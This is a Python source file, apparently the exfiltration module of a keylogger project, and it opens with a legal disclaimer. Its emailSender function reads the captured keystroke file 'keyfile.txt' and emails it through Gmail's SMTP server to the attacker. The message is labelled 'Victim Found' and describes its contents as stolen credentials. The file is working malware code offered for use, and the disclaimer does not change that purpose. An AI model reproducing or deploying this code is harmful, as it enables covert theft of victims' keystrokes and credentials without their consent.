#!Legal Disclaimer
# The usage of this keylogger project for attacking targets without prior mutual consent is illegal.
# It is the end user's responsibility to obey all applicable local, state and federal laws.
# The developers behind the project assume no liability and are not
# responsible for any misuse or damage caused by this program.

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

#function to send the email via SMTP
def emailSender():
    
    sender_email = "youremailhere" #the email you want the mail to send from
    sender_password = "yourapppasswordhere" #Google account 'app password' here not regular password
    recipient_email = "youremailhere"#the email you want to send the mail to.


    #Running the program with invalid email login credentials will result in python to keep trying to send the email
    #but since the email login details are invalid it will continue looping over and over to send email,which will
    #make the program not work as intended,so please enter valid login details

    
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = recipient_email
    msg["Subject"] = "Victim Found"

    body = "Victim found,here are the stolen credentials"
    msg.attach(MIMEText(body, "plain"))
#attaching the .txt file with the mail
    filename = 'keyfile.txt'
    with open(filename, 'rb') as f:
        attachment = MIMEApplication(f.read(), _subtype="txt")
        attachment.add_header('content-Disposition', 'attachment', filename=filename)
        msg.attach(attachment)

    with smtplib.SMTP("smtp.gmail.com", 587) as smtp: #Google's server and port
        smtp.starttls()
        smtp.login(sender_email, sender_password)
        smtp.send_message(msg)
